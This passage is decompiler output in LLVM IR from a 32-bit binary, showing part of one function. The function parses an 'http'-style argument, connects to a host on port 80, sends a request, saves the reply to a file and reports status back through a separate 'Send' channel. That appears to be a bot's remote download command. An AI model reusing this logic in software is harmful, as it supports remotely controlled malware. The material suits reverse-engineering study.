  %v4_8052e76 = call i32 @Send(i32 %arg1, i32 ptrtoint ([40 x i8]* @global_var_806a904.533 to i32))
  store i1 %v5_8052e4c, i1* %cf.global-to-local, align 1
  %v2_8052e83 = call i32 @__GI_exit(i32 0)
  %v0_8052e88.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052e88

dec_label_pc_8052e88:                             ; preds = %dec_label_pc_8052e62, %dec_label_pc_8052e68
  %v0_8052e88 = phi i32 [ %v0_8052e88.pre, %dec_label_pc_8052e68 ], [ %v12_8052e31, %dec_label_pc_8052e62 ]
  %v5_8052e88 = icmp ult i32 %v0_8052e88, 4
  store i1 %v5_8052e88, i1* %cf.global-to-local, align 1
  %v5_8052e91 = call i32 @socket(i32 2, i32 1, i32 0)
  %v8_8052e9c = icmp ne i32 %v5_8052e91, -1
  store i1 %v8_8052e9c, i1* %cf.global-to-local, align 1
  %v13_8052e9c = icmp eq i32 %v5_8052e91, -1
  %v1_8052ea0 = icmp eq i1 %v13_8052e9c, false
  br i1 %v1_8052ea0, label %dec_label_pc_8052ec2, label %dec_label_pc_8052ea2

dec_label_pc_8052ea2:                             ; preds = %dec_label_pc_8052e88
  %v5_8052ea2 = icmp ult i32* %stack_var_-6252, inttoptr (i32 4 to i32*)
  store i1 %v5_8052ea2, i1* %cf.global-to-local, align 1
  %v4_8052eb0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_8068b90.39 to i32))
  store i1 %v5_8052e4c, i1* %cf.global-to-local, align 1
  %v2_8052ebd = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8052ec2

dec_label_pc_8052ec2:                             ; preds = %dec_label_pc_8052e88, %dec_label_pc_8052ea2
  %v1_8052ec5 = add i32 %arg4, 4
  %v5_8052ec5 = icmp ugt i32 %arg4, -5
  store i1 %v5_8052ec5, i1* %cf.global-to-local, align 1
  %v1_8052ec8 = inttoptr i32 %v1_8052ec5 to i32*
  %v2_8052ec8 = load i32, i32* %v1_8052ec8, align 4
  store i1 false, i1* @df, align 1
  %v4_8052ee5 = inttoptr i32 %v2_8052ec8 to i8*
  store i32 %v2_8052ec8, i32* @esi, align 4
  %v7_8052ef7 = call i32 @_strncmp(i8* %v4_8052ee5, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8068bb5.40, i32 0, i32 0), i32 7)
  %v8_8052ef7 = urem i32 %v7_8052ef7, 2
  %v9_8052ef7 = icmp eq i32 %v8_8052ef7, 0
  %v0_8052ef9 = load i1, i1* %cf.global-to-local, align 1
  %v2_8052ef9 = or i1 %v0_8052ef9, %v9_8052ef7
  %v3_8052ef9 = zext i1 %v2_8052ef9 to i32
  %v4_8052ef9 = load i32, i32* @edx, align 4
  %v5_8052ef9 = and i32 %v4_8052ef9, -256
  %v6_8052ef9 = or i32 %v3_8052ef9, %v5_8052ef9
  %v7_8052ef9 = xor i32 %v6_8052ef9, 1
  store i32 %v7_8052ef9, i32* %edx.global-to-local, align 4
  %v1_8052f01 = trunc i32 %v7_8052ef9 to i8
  %v3_8052f01 = zext i1 %v0_8052ef9 to i8
  %v15_8052f01 = icmp eq i8 %v1_8052f01, %v3_8052f01
  %v1_8052f0a = icmp eq i1 %v15_8052f01, false
  store i1 %v5_8052ec5, i1* %cf.global-to-local, align 1
  %v2_8052f32 = load i32, i32* %v1_8052ec8, align 4
  br i1 %v1_8052f0a, label %dec_label_pc_8052f2c, label %dec_label_pc_8052f0c

dec_label_pc_8052f0c:                             ; preds = %dec_label_pc_8052ec2
  %v1_8052f14 = add i32 %v2_8052f32, 7
  %v0_8052f17 = load i32, i32* @esp, align 4
  %v5_8052f17 = icmp ult i32 %v0_8052f17, 8
  store i1 %v5_8052f17, i1* %cf.global-to-local, align 1
  %v2_8052f1b = ptrtoint i32* %stack_var_-1096 to i32
  store i32 %v2_8052f1b, i32* @eax, align 4
  %tmp81 = bitcast i32* %stack_var_-1096 to i8*
  %v5_8052f22 = call i32 @strcpy(i8* %tmp81, i32 %v1_8052f14)
  br label %dec_label_pc_8052f47

dec_label_pc_8052f2c:                             ; preds = %dec_label_pc_8052ec2
  %v0_8052f34 = load i32, i32* @esp, align 4
  %v5_8052f34 = icmp ult i32 %v0_8052f34, 8
  store i1 %v5_8052f34, i1* %cf.global-to-local, align 1
  %v2_8052f38 = ptrtoint i32* %stack_var_-1096 to i32
  store i32 %v2_8052f38, i32* @eax, align 4
  %tmp82 = bitcast i32* %stack_var_-1096 to i8*
  %v5_8052f3f = call i32 @strcpy(i8* %tmp82, i32 %v2_8052f32)
  br label %dec_label_pc_8052f47

dec_label_pc_8052f47:                             ; preds = %dec_label_pc_8052f0c, %dec_label_pc_8052f2c
  %v4_8052f6a.pre-phi = phi i8* [ %tmp81, %dec_label_pc_8052f0c ], [ %tmp82, %dec_label_pc_8052f2c ]
  %v2_8052f56.pre-phi = phi i32 [ %v2_8052f1b, %dec_label_pc_8052f0c ], [ %v2_8052f38, %dec_label_pc_8052f2c ]
  %storemerge16.in = load i32, i32* @esp, align 4
  %storemerge16 = icmp ugt i32 %storemerge16.in, -17
  store i1 %storemerge16, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8052f53

dec_label_pc_8052f50:                             ; preds = %dec_label_pc_8052f7b
  %v4_8052f50 = add i32 %storemerge8, 1
  br label %dec_label_pc_8052f53

dec_label_pc_8052f53:                             ; preds = %dec_label_pc_8052f47, %dec_label_pc_8052f50
  %storemerge8 = phi i32 [ %v4_8052f50, %dec_label_pc_8052f50 ], [ 0, %dec_label_pc_8052f47 ]
  store i32 %storemerge8, i32* @edx, align 4
  store i1 false, i1* @df, align 1
  store i32 %v2_8052f56.pre-phi, i32* @edi, align 4
  %v3_8052f70 = call i32 @_strlen(i8* %v4_8052f6a.pre-phi)
  %v0_8052f77 = load i32, i32* @edx, align 4
  %v7_8052f77 = icmp ult i32 %v0_8052f77, %v3_8052f70
  store i1 %v7_8052f77, i1* %cf.global-to-local, align 1
  %v1_8052f79 = icmp eq i1 %v7_8052f77, false
  br i1 %v1_8052f79, label %dec_label_pc_8052f53.dec_label_pc_8052f89_crit_edge, label %dec_label_pc_8052f7b

dec_label_pc_8052f53.dec_label_pc_8052f89_crit_edge: ; preds = %dec_label_pc_8052f53
  %v0_8052f8c.pre = load i32, i32* @ebp, align 4
  %.pre = add i32 %storemerge8, -1092
  br label %dec_label_pc_8052f89

dec_label_pc_8052f7b:                             ; preds = %dec_label_pc_8052f53
  %v0_8052f7e = load i32, i32* @ebp, align 4
  %v2_8052f7e = add i32 %storemerge8, -1092
  %v3_8052f7e = add i32 %v0_8052f7e, %v2_8052f7e
  %v4_8052f7e = inttoptr i32 %v3_8052f7e to i8*
  %v5_8052f7e = load i8, i8* %v4_8052f7e, align 1
  %v6_8052f85 = icmp ult i8 %v5_8052f7e, 47
  store i1 %v6_8052f85, i1* %cf.global-to-local, align 1
  %v10_8052f85 = icmp eq i8 %v5_8052f7e, 47
  %v1_8052f87 = icmp eq i1 %v10_8052f85, false
  br i1 %v1_8052f87, label %dec_label_pc_8052f50, label %dec_label_pc_8052f89

dec_label_pc_8052f89:                             ; preds = %dec_label_pc_8052f7b, %dec_label_pc_8052f53.dec_label_pc_8052f89_crit_edge
  %v2_8052f8c.pre-phi = phi i32 [ %.pre, %dec_label_pc_8052f53.dec_label_pc_8052f89_crit_edge ], [ %v2_8052f7e, %dec_label_pc_8052f7b ]
  %v0_8052f8c = phi i32 [ %v0_8052f8c.pre, %dec_label_pc_8052f53.dec_label_pc_8052f89_crit_edge ], [ %v0_8052f7e, %dec_label_pc_8052f7b ]
  %v3_8052f8c = add i32 %v0_8052f8c, %v2_8052f8c.pre-phi
  %v4_8052f8c = inttoptr i32 %v3_8052f8c to i8*
  store i8 0, i8* %v4_8052f8c, align 1
  store i32 2, i32* %stack_var_-72, align 4
  %v0_8052f9a = load i32, i32* @esp, align 4
  %v5_8052f9a = icmp ult i32 %v0_8052f9a, 12
  store i1 %v5_8052f9a, i1* %cf.global-to-local, align 1
  %v2_8052f9f = call i32 @htons(i32 80)
  store i1 %v5_8052e4c, i1* %cf.global-to-local, align 1
  %v2_8052fb5 = call i32 @inet_addr(i32 %v2_8052f56.pre-phi)
  %v8_8052fc0 = icmp ne i32 %v2_8052fb5, -1
  store i1 %v8_8052fc0, i1* %cf.global-to-local, align 1
  %v13_8052fc0 = icmp eq i32 %v2_8052fb5, -1
  %v1_8052fc4 = icmp eq i1 %v13_8052fc0, false
  br i1 %v1_8052fc4, label %dec_label_pc_8053020, label %dec_label_pc_8052fc6

dec_label_pc_8052fc6:                             ; preds = %dec_label_pc_8052f89
  store i1 %v5_8052e4c, i1* %cf.global-to-local, align 1
  %v2_8052fd0 = call i32 @__GI_gethostbyname(i32 %v2_8052f56.pre-phi)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8052fdb = icmp eq i32 %v2_8052fd0, 0
  %v1_8052fdf = icmp eq i1 %v4_8052fdb, false
  br i1 %v1_8052fdf, label %dec_label_pc_8053001, label %dec_label_pc_8052fe1

dec_label_pc_8052fe1:                             ; preds = %dec_label_pc_8052fc6
  %v5_8052fe1 = icmp ult i32* %stack_var_-6252, inttoptr (i32 4 to i32*)
  store i1 %v5_8052fe1, i1* %cf.global-to-local, align 1
  %v4_8052fef = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_8068bc0.41 to i32))
  store i1 %v5_8052e4c, i1* %cf.global-to-local, align 1
  %v2_8052ffc = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8053001

dec_label_pc_8053001:                             ; preds = %dec_label_pc_8052fc6, %dec_label_pc_8052fe1
  %v1_8053004 = add i32 %v2_8052fd0, 12
  %v2_8053004 = inttoptr i32 %v1_8053004 to i32*
  %v3_8053004 = load i32, i32* %v2_8053004, align 4
  %v1_805300c = add i32 %v2_8052fd0, 16
  %v2_805300c = inttoptr i32 %v1_805300c to i32*
  %v3_805300c = load i32, i32* %v2_805300c, align 4
  %v1_805300f = inttoptr i32 %v3_805300c to i32*
  %v2_805300f = load i32, i32* %v1_805300f, align 4
  store i32 %v2_805300f, i32* %edx.global-to-local, align 4
  %v5_8053014 = icmp eq i32* %stack_var_-72, inttoptr (i32 -4 to i32*)
  store i1 %v5_8053014, i1* %cf.global-to-local, align 1
  %v15_8053014 = ptrtoint i32* %stack_var_-68 to i32
  %tmp83 = bitcast i32* %stack_var_-68 to i8*
  store i32 %v15_8053014, i32* @edi, align 4
  %v1_8053019 = inttoptr i32 %v2_805300f to i8*
  store i32 %v2_805300f, i32* @esi, align 4
  store i1 false, i1* @df, align 1
  %v7_805301c = call i8* @_memcpy(i8* %tmp83, i8* %v1_8053019, i32 %v3_8053004)
  br label %dec_label_pc_8053026

dec_label_pc_8053020:                             ; preds = %dec_label_pc_8052f89
  store i32 %v2_8052fb5, i32* %stack_var_-68, align 4
  br label %dec_label_pc_8053026

dec_label_pc_8053026:                             ; preds = %dec_label_pc_8053001, %dec_label_pc_8053020
  %v2_805302d.pre-phi = ptrtoint i32* %stack_var_-72 to i32
  %v5_8053030 = icmp ugt i32* %stack_var_-72, inttoptr (i32 -9 to i32*)
  store i1 %v5_8053030, i1* %cf.global-to-local, align 1
  %tmp84 = bitcast i32* %stack_var_-64 to i8*
  %v6_8053034 = call i32 @__GI_memset(i8* %tmp84, i32 0, i32 8)
  %v5_805303f = icmp ult i32* %stack_var_-6252, inttoptr (i32 4 to i32*)
  store i1 %v5_805303f, i1* %cf.global-to-local, align 1
  %v5_8053048 = call i32 @connect(i32 %v5_8052e91, i32 %v2_805302d.pre-phi, i32 16)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8053050 = icmp eq i32 %v5_8053048, 0
  br i1 %v1_8053050, label %dec_label_pc_8053026.dec_label_pc_8053074_crit_edge, label %dec_label_pc_8053054

dec_label_pc_8053026.dec_label_pc_8053074_crit_edge: ; preds = %dec_label_pc_8053026
  br label %dec_label_pc_8053074

dec_label_pc_8053054:                             ; preds = %dec_label_pc_8053026
  store i1 %v5_805303f, i1* %cf.global-to-local, align 1
  %v4_8053062 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_8068be8.42 to i32))
  store i1 %v5_8052e4c, i1* %cf.global-to-local, align 1
  %v2_805306f = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8053074

dec_label_pc_8053074:                             ; preds = %dec_label_pc_8053026.dec_label_pc_8053074_crit_edge, %dec_label_pc_8053054
  %v2_805307f = add i32 %storemerge8, %v2_8052f56.pre-phi
  %v7_805307f = icmp ult i32 %v2_805307f, %v2_8052f56.pre-phi
  store i1 %v7_805307f, i1* %cf.global-to-local, align 1
  %v1_8053081 = add i32 %v2_805307f, 1
  store i32 %v1_8053081, i32* %edx.global-to-local, align 4
  %v4_8053094 = call i32 @Send(i32 %v5_8052e91, i32 ptrtoint ([277 x i8]* @global_var_806a92c.534 to i32))
  store i1 %v5_805303f, i1* %cf.global-to-local, align 1
  %v4_80530aa = call i32 @Send(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_8068d24.44 to i32))
  %v1_80530b5 = add i32 %arg4, 8
  %v5_80530b5 = icmp ugt i32 %arg4, -9
  %v1_80530b8 = inttoptr i32 %v1_80530b5 to i32*
  %v2_80530b8 = load i32, i32* %v1_80530b8, align 4
  store i32 %v2_80530b8, i32* @eax, align 4
  store i1 %v5_8052e37, i1* %cf.global-to-local, align 1
  %v4_80530c3 = call i32 @__GI_fopen(i32 %v2_80530b8, i32 ptrtoint ([3 x i8]* @global_var_8068d40.45 to i32))
  %v0_80530c8 = load i32, i32* @esp, align 4
  %v2_80530c8 = icmp ugt i32 %v0_80530c8, -17
  store i1 %v2_80530c8, i1* %cf.global-to-local, align 1
  %v2_80530d5 = ptrtoint i32* %stack_var_-5192 to i32
  %v6_80530df127 = call i32 @recv(i32 %v5_8052e91, i32 %v2_80530d5, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp85129 = icmp slt i32 %v6_80530df127, 1
  br i1 %tmp85129, label %dec_label_pc_805320b.loopexit17, label %dec_label_pc_80530f4

dec_label_pc_80530ce.loopexit:                    ; preds = %dec_label_pc_80531f7
  %v6_80530df = call i32 @recv(i32 %v5_8052e91, i32 %v2_80530d5, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp85 = icmp slt i32 %v6_80530df, 1
  br i1 %tmp85, label %dec_label_pc_805320b.loopexit17, label %dec_label_pc_80530f4

dec_label_pc_80530f4:                             ; preds = %dec_label_pc_8053074, %dec_label_pc_80530ce.loopexit
  %v6_80530df130 = phi i32 [ %v6_80530df, %dec_label_pc_80530ce.loopexit ], [ %v6_80530df127, %dec_label_pc_8053074 ]
  %v4_80530f4 = add i32 %v6_80530df130, -4095
  %v8_80530f4 = icmp ult i32 %v6_80530df130, 4095
  %v9_80530f4 = sub i32 4094, %v6_80530df130
  %v10_80530f4 = and i32 %v9_80530f4, %v6_80530df130
  %v11_80530f4 = icmp slt i32 %v10_80530f4, 0
  store i1 %v8_80530f4, i1* %cf.global-to-local, align 1
  %v12_80530f4 = icmp eq i32 %v4_80530f4, 0
  %v13_80530f4 = icmp slt i32 %v4_80530f4, 0
  %v3_80530fb = icmp eq i1 %v13_80530f4, %v11_80530f4
  %v4_80530fb = icmp eq i1 %v12_80530f4, false
  %v5_80530fb = and i1 %v4_80530fb, %v3_80530fb
  br i1 %v5_80530fb, label %dec_label_pc_8053114.lr.ph, label %dec_label_pc_80530fd

dec_label_pc_80530fd:                             ; preds = %dec_label_pc_80530f4
  %v0_8053100 = load i32, i32* @ebp, align 4
  %v2_8053100 = add i32 %v6_80530df130, -5188
  %v3_8053100 = add i32 %v2_8053100, %v0_8053100
  %v4_8053100 = inttoptr i32 %v3_8053100 to i8*
  store i8 0, i8* %v4_8053100, align 1
  br label %dec_label_pc_8053114.lr.ph

dec_label_pc_8053114.lr.ph:                       ; preds = %dec_label_pc_80530fd, %dec_label_pc_80530f4
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8053114

dec_label_pc_8053114:                             ; preds = %dec_label_pc_8053114.lr.ph, %dec_label_pc_80531f7
  %storemerge7126 = phi i32 [ 0, %dec_label_pc_8053114.lr.ph ], [ %v4_80531f7, %dec_label_pc_80531f7 ]
  store i32 %storemerge7126, i32* %edx.global-to-local, align 4
  %v2_805311f = add i32 %storemerge7126, %v2_80530d5
  %v7_805311f = icmp ult i32 %v2_805311f, %v2_80530d5
  store i1 %v7_805311f, i1* %cf.global-to-local, align 1
  store i1 false, i1* @df, align 1
  %v4_805313c = inttoptr i32 %v2_805311f to i8*
  store i32 %v2_805311f, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8068d43.46 to i32), i32* @edi, align 4
  %v7_805314e = call i32 @_strncmp(i8* %v4_805313c, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8068d43.46, i32 0, i32 0), i32 4)
  %v8_805314e = urem i32 %v7_805314e, 2
  %v9_805314e = icmp eq i32 %v8_805314e, 0
  %v0_8053150 = load i1, i1* %cf.global-to-local, align 1
  %v2_8053150 = or i1 %v0_8053150, %v9_805314e
  %v3_8053150 = zext i1 %v2_8053150 to i32
  %v4_8053150 = load i32, i32* %edx.global-to-local, align 4
  %v5_8053150 = and i32 %v4_8053150, -256
  %v6_8053150 = or i32 %v3_8053150, %v5_8053150
  %v7_8053150 = xor i32 %v6_8053150, 1
  store i32 %v7_8053150, i32* @edx, align 4
  %v3_8053156 = and i32 %v7_805314e, -256
  %v1_8053158 = trunc i32 %v7_8053150 to i8
  %v3_8053158 = zext i1 %v0_8053150 to i8
  %v4_8053158 = sub nsw i8 %v1_8053158, %v3_8053158
  %v15_8053158 = icmp eq i8 %v4_8053158, 0
  %v20_8053158 = zext i8 %v4_8053158 to i32
  %v23_8053158 = or i32 %v20_8053158, %v3_8053156
  store i32 %v23_8053158, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8053161 = icmp eq i1 %v15_8053158, false
  br i1 %v1_8053161, label %dec_label_pc_80531f7, label %dec_label_pc_8053167

dec_label_pc_8053167:                             ; preds = %dec_label_pc_8053114
  %v4_8053167 = add i32 %storemerge7126, 4
  %v1_8053176 = add i32 %v4_80530c3, 52
  %v2_8053176 = inttoptr i32 %v1_8053176 to i32*
  %v1_8053180 = add i32 %v4_80530c3, 16
  %v2_8053180 = inttoptr i32 %v1_8053180 to i32*
  %v1_8053186 = add i32 %v4_80530c3, 28
  %v2_8053186 = inttoptr i32 %v1_8053186 to i32*
  %v10_80531ec110 = icmp ult i32 %v4_8053167, %v6_80530df130
  store i1 %v10_80531ec110, i1* %cf.global-to-local, align 1
  %v5_80531ef116 = icmp slt i32 %v4_8053167, %v6_80530df130
  br i1 %v5_80531ef116, label %dec_label_pc_805316d, label %dec_label_pc_805320b

dec_label_pc_805316d:                             ; preds = %dec_label_pc_8053167, %dec_label_pc_80531e6
  %storemerge13.in117 = phi i32 [ %v4_80531e6, %dec_label_pc_80531e6 ], [ %v4_8053167, %dec_label_pc_8053167 ]
  %v3_8053176 = load i32, i32* %v2_8053176, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8053179 = icmp eq i32 %v3_8053176, 0
  br i1 %v1_8053179, label %dec_label_pc_80531c8, label %dec_label_pc_805317d

dec_label_pc_805317d:                             ; preds = %dec_label_pc_805316d
  %v3_8053180 = load i32, i32* %v2_8053180, align 4
  store i32 %v3_8053180, i32* @edx, align 4
  %v3_8053186 = load i32, i32* %v2_8053186, align 4
  %v7_8053189 = icmp ult i32 %v3_8053180, %v3_8053186
  store i1 %v7_8053189, i1* %cf.global-to-local, align 1
  %v1_805318b = icmp eq i1 %v7_8053189, false
  br i1 %v1_805318b, label %dec_label_pc_80531a8, label %dec_label_pc_805318d

dec_label_pc_805318d:                             ; preds = %dec_label_pc_805317d
  %v3_8053190 = load i32, i32* %v2_8053180, align 4
  store i32 %v3_8053190, i32* %edx.global-to-local, align 4
  %v0_8053196 = load i32, i32* @ebp, align 4
  %v2_8053196 = add i32 %storemerge13.in117, -5188
  %v3_8053196 = add i32 %v2_8053196, %v0_8053196
  %v4_8053196 = inttoptr i32 %v3_8053196 to i8*
  %v5_8053196 = load i8, i8* %v4_8053196, align 1
  %v3_805319d = inttoptr i32 %v3_8053190 to i8*
  store i8 %v5_8053196, i8* %v3_805319d, align 1
  %v0_805319f = load i32, i32* %edx.global-to-local, align 4
  %v1_805319f = add i32 %v0_805319f, 1
  store i32 %v1_805319f, i32* @edx, align 4
  store i32 %v1_805319f, i32* %v2_8053180, align 4
  br label %dec_label_pc_80531e6

dec_label_pc_80531a8:                             ; preds = %dec_label_pc_805317d
  %v0_80531ab = load i32, i32* @ebp, align 4
  %v2_80531ab = add i32 %storemerge13.in117, -5188
  %v3_80531ab = add i32 %v2_80531ab, %v0_80531ab
  %v4_80531ab = inttoptr i32 %v3_80531ab to i8*
  %v5_80531ab = load i8, i8* %v4_80531ab, align 1
  %v0_80531b7 = load i32, i32* @esp, align 4
  %v5_80531b7 = icmp ult i32 %v0_80531b7, 8
  store i1 %v5_80531b7, i1* %cf.global-to-local, align 1
  %v5_80531be = call i32 @putc_unlocked(i8 %v5_80531ab, i32 %v4_80530c3)
  %v0_80531c3 = load i32, i32* @esp, align 4
  %v2_80531c3 = icmp ugt i32 %v0_80531c3, -17
  store i1 %v2_80531c3, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_80531e6

dec_label_pc_80531c8:                             ; preds = %dec_label_pc_805316d
  %v0_80531cb = load i32, i32* @ebp, align 4
  %v2_80531cb = add i32 %storemerge13.in117, -5188
  %v3_80531cb = add i32 %v2_80531cb, %v0_80531cb
  %v4_80531cb = inttoptr i32 %v3_80531cb to i8*
  %v5_80531cb = load i8, i8* %v4_80531cb, align 1
  %v0_80531d7 = load i32, i32* @esp, align 4
  %v5_80531d7 = icmp ult i32 %v0_80531d7, 8
  store i1 %v5_80531d7, i1* %cf.global-to-local, align 1
  %v5_80531de = call i32 @__GI_fputc(i8 %v5_80531cb, i32 %v4_80530c3)
  %v0_80531e3 = load i32, i32* @esp, align 4
  %v2_80531e3 = icmp ugt i32 %v0_80531e3, -17
  store i1 %v2_80531e3, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_80531e6

dec_label_pc_80531e6:                             ; preds = %dec_label_pc_80531a8, %dec_label_pc_805318d, %dec_label_pc_80531c8
  %v4_80531e6 = add i32 %storemerge13.in117, 1
  %v10_80531ec = icmp ult i32 %v4_80531e6, %v6_80530df130
  store i1 %v10_80531ec, i1* %cf.global-to-local, align 1
  %exitcond135 = icmp eq i32 %v4_80531e6, %v6_80530df130
  br i1 %exitcond135, label %dec_label_pc_805320b, label %dec_label_pc_805316d

dec_label_pc_80531f7:                             ; preds = %dec_label_pc_8053114
  %v4_80531f7 = add nuw nsw i32 %storemerge7126, 1
  %v10_80531fd = icmp ult i32 %v4_80531f7, %v6_80530df130
  store i1 %v10_80531fd, i1* %cf.global-to-local, align 1
  %v5_8053200 = icmp slt i32 %v4_80531f7, %v6_80530df130
  br i1 %v5_8053200, label %dec_label_pc_8053114, label %dec_label_pc_80530ce.loopexit

dec_label_pc_805320b.loopexit17:                  ; preds = %dec_label_pc_80530ce.loopexit, %dec_label_pc_8053074
  %.pre31 = add i32 %v4_80530c3, 52
  %.pre32 = inttoptr i32 %.pre31 to i32*
  %.pre34 = add i32 %v4_80530c3, 16
  %.pre35 = inttoptr i32 %.pre34 to i32*
  %.pre36 = add i32 %v4_80530c3, 28
  %.pre37 = inttoptr i32 %.pre36 to i32*
  br label %dec_label_pc_805320b

dec_label_pc_805320b:                             ; preds = %dec_label_pc_8053167, %dec_label_pc_80531e6, %dec_label_pc_805320b.loopexit17
  %v2_8053283.pre-phi = phi i32* [ %.pre37, %dec_label_pc_805320b.loopexit17 ], [ %v2_8053186, %dec_label_pc_80531e6 ], [ %v2_8053186, %dec_label_pc_8053167 ]
  %v2_805327d.pre-phi = phi i32* [ %.pre35, %dec_label_pc_805320b.loopexit17 ], [ %v2_8053180, %dec_label_pc_80531e6 ], [ %v2_8053180, %dec_label_pc_8053167 ]
  %v2_8053273.pre-phi = phi i32* [ %.pre32, %dec_label_pc_805320b.loopexit17 ], [ %v2_8053176, %dec_label_pc_80531e6 ], [ %v2_8053176, %dec_label_pc_8053167 ]
  store i1 %v5_80530b5, i1* %cf.global-to-local, align 1
  %v4_805321f = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_806aa44.535 to i32))
  %v0_8053224 = load i32, i32* @esp, align 4
  %v2_8053224 = icmp ugt i32 %v0_8053224, -17
  store i1 %v2_8053224, i1* %cf.global-to-local, align 1
  %v6_8053238105 = call i32 @recv(i32 %v5_8052e91, i32 %v2_80530d5, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp86107 = icmp slt i32 %v6_8053238105, 1
  br i1 %tmp86107, label %dec_label_pc_80532f7, label %dec_label_pc_805324d

dec_label_pc_8053227.loopexit:                    ; preds = %dec_label_pc_80532e3
  %v6_8053238 = call i32 @recv(i32 %v5_8052e91, i32 %v2_80530d5, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp86 = icmp slt i32 %v6_8053238, 1
  br i1 %tmp86, label %dec_label_pc_80532f7, label %dec_label_pc_805324d

dec_label_pc_805324d:                             ; preds = %dec_label_pc_805320b, %dec_label_pc_8053227.loopexit
  %v6_8053238108 = phi i32 [ %v6_8053238, %dec_label_pc_8053227.loopexit ], [ %v6_8053238105, %dec_label_pc_805320b ]
  %v4_805324d = add i32 %v6_8053238108, -4095
  %v8_805324d = icmp ult i32 %v6_8053238108, 4095
  %v9_805324d = sub i32 4094, %v6_8053238108
  %v10_805324d = and i32 %v9_805324d, %v6_8053238108
  %v11_805324d = icmp slt i32 %v10_805324d, 0
  store i1 %v8_805324d, i1* %cf.global-to-local, align 1
  %v12_805324d = icmp eq i32 %v4_805324d, 0
  %v13_805324d = icmp slt i32 %v4_805324d, 0
  %v3_8053254 = icmp eq i1 %v13_805324d, %v11_805324d
  %v4_8053254 = icmp eq i1 %v12_805324d, false
  %v5_8053254 = and i1 %v4_8053254, %v3_8053254
  br i1 %v5_8053254, label %dec_label_pc_805326a.lr.ph, label %dec_label_pc_8053256

dec_label_pc_8053256:                             ; preds = %dec_label_pc_805324d
  %v0_8053259 = load i32, i32* @ebp, align 4
  %v2_8053259 = add i32 %v6_8053238108, -5188
  %v3_8053259 = add i32 %v2_8053259, %v0_8053259
  %v4_8053259 = inttoptr i32 %v3_8053259 to i8*
  store i8 0, i8* %v4_8053259, align 1
  br label %dec_label_pc_805326a.lr.ph

dec_label_pc_805326a.lr.ph:                       ; preds = %dec_label_pc_8053256, %dec_label_pc_805324d
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_805326a

dec_label_pc_805326a:                             ; preds = %dec_label_pc_80532e3, %dec_label_pc_805326a.lr.ph
  %storemerge5104 = phi i32 [ 0, %dec_label_pc_805326a.lr.ph ], [ %v4_80532e3, %dec_label_pc_80532e3 ]
  %v3_8053273 = load i32, i32* %v2_8053273.pre-phi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8053276 = icmp eq i32 %v3_8053273, 0
  br i1 %v1_8053276, label %dec_label_pc_80532c5, label %dec_label_pc_805327a

dec_label_pc_805327a:                             ; preds = %dec_label_pc_805326a
  %v3_805327d = load i32, i32* %v2_805327d.pre-phi, align 4
  store i32 %v3_805327d, i32* @edx, align 4
  %v3_8053283 = load i32, i32* %v2_8053283.pre-phi, align 4
  %v7_8053286 = icmp ult i32 %v3_805327d, %v3_8053283
  store i1 %v7_8053286, i1* %cf.global-to-local, align 1
  %v1_8053288 = icmp eq i1 %v7_8053286, false
  br i1 %v1_8053288, label %dec_label_pc_80532a5, label %dec_label_pc_805328a

dec_label_pc_805328a:                             ; preds = %dec_label_pc_805327a
  %v3_805328d = load i32, i32* %v2_805327d.pre-phi, align 4
  store i32 %v3_805328d, i32* %edx.global-to-local, align 4
  %v0_8053293 = load i32, i32* @ebp, align 4
  %v2_8053293 = add nsw i32 %storemerge5104, -5188
  %v3_8053293 = add i32 %v2_8053293, %v0_8053293
  %v4_8053293 = inttoptr i32 %v3_8053293 to i8*
  %v5_8053293 = load i8, i8* %v4_8053293, align 1
  %v3_805329a = inttoptr i32 %v3_805328d to i8*
  store i8 %v5_8053293, i8* %v3_805329a, align 1
  %v0_805329c = load i32, i32* %edx.global-to-local, align 4
  %v1_805329c = add i32 %v0_805329c, 1
  store i32 %v1_805329c, i32* @edx, align 4
  store i32 %v1_805329c, i32* %v2_805327d.pre-phi, align 4
  br label %dec_label_pc_80532e3

dec_label_pc_80532a5:                             ; preds = %dec_label_pc_805327a
  %v0_80532a8 = load i32, i32* @ebp, align 4
  %v2_80532a8 = add nsw i32 %storemerge5104, -5188
  %v3_80532a8 = add i32 %v2_80532a8, %v0_80532a8
  %v4_80532a8 = inttoptr i32 %v3_80532a8 to i8*
  %v5_80532a8 = load i8, i8* %v4_80532a8, align 1
  %v0_80532b4 = load i32, i32* @esp, align 4
  %v5_80532b4 = icmp ult i32 %v0_80532b4, 8
  store i1 %v5_80532b4, i1* %cf.global-to-local, align 1
  %v5_80532bb = call i32 @putc_unlocked(i8 %v5_80532a8, i32 %v4_80530c3)
  %v0_80532c0 = load i32, i32* @esp, align 4
  %v2_80532c0 = icmp ugt i32 %v0_80532c0, -17
  store i1 %v2_80532c0, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_80532e3

